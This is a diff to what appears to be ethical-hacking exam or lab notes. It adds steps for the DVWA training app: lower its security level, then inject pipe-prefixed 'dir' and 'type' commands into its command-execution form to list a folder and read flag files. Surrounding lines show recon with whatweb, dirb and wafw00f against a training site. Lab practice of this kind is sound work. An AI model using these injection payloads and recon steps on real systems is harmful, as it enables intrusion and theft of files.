@@ -8,6 +8,13 @@ whatweb http://www.abc.com
 dirb http://training.cehorg.com -X .txt
 http://training.cehorg.com/Flag.txt
 ```
+#### Given website and folder C:\Wamp64\www\DVWA\ECweb\Certified\” 
+```bash
+login to the dvwa application > set security level low > choose command execution type below commands
+| dir "C:\Wamp64\www\DVWA\ECweb\Certified"
+| type "C:\Wamp64\www\DVWA\ECweb\Certified\Flag1.txt"
+| type "C:\Wamp64\www\DVWA\ECweb\Certified\Flag2.txt"
+```
 #### Firewall
 ```bash
 wafw00f
